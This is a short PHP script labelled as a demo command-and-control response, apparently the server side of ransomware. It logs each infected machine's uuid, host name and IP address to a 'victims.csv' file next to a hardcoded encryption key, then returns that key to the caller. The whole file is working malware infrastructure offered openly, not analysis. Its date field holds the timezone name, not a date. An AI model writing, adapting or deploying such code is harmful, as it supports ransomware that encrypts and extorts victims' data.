<?php
//Demo C&C response without DB intergration

date_default_timezone_set("Asia/Jakarta");

if(isset($_GET['uuid'])) {

  $datenow = date_default_timezone_get();

  $user_ip = $_SERVER['REMOTE_ADDR'];
  $encryption_key = "75e1250ba8d778000f2ab9f3a783e607";

  $file = fopen("victims.csv","a");
  $userData = array($datenow, $_GET['uuid'], $_GET['host'], $user_ip, $encryption_key);
  fputcsv($file, $userData);
  fclose($file);

  echo $encryption_key;

}

 ?>
